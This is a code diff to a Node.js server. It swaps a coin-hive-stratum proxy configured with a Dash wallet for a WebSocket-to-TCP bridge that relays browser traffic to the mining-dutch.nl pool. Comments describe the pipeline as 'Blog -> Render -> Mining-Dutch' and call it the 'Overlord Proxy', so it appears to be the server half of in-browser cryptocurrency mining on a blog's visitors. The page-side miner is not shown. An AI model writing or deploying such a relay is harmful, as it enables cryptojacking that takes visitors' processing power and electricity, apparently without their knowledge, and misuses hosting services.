@@ -1,14 +1,22 @@
-const Stratum = require('coin-hive-stratum');
+const Net = require('net');
+const WebSocket = require('ws');
 
-// This connects your browser to zpool.ca
-const proxy = new Stratum({
-  host: 'x11.mine.zpool.ca',
-  port: 3533,
-  key: 'Xxo7XaZhnnkHz55mYSdQuGj93MWD3Bhcu1' // Your Dash Wallet
+// THE CORE PIPE: Blog -> Render -> Mining-Dutch
+const POOL_HOST = 'dash.mining-dutch.nl';
+const POOL_PORT = 3333; // X11 Port
+
+const wss = new WebSocket.Server({ port: process.env.PORT || 3000 });
+
+wss.on('connection', (ws) => {
+    const client = new Net.Socket();
+    client.connect(POOL_PORT, POOL_HOST, () => {
+        console.log("CONNECTED TO DUTCH POOL");
+    });
+
+    ws.on('message', (msg) => { client.write(msg + '\n'); });
+    client.on('data', (data) => { ws.send(data.toString()); });
+    
+    ws.on('close', () => client.destroy());
+    client.on('error', () => ws.terminate());
 });
-
-// This starts the bridge on Render's network
-const port = process.env.PORT || 3000;
-proxy.listen(port);
-
-console.log(`Overlord Proxy running on port ${port}`);
+console.log("PROXY ENGINE ACTIVE");
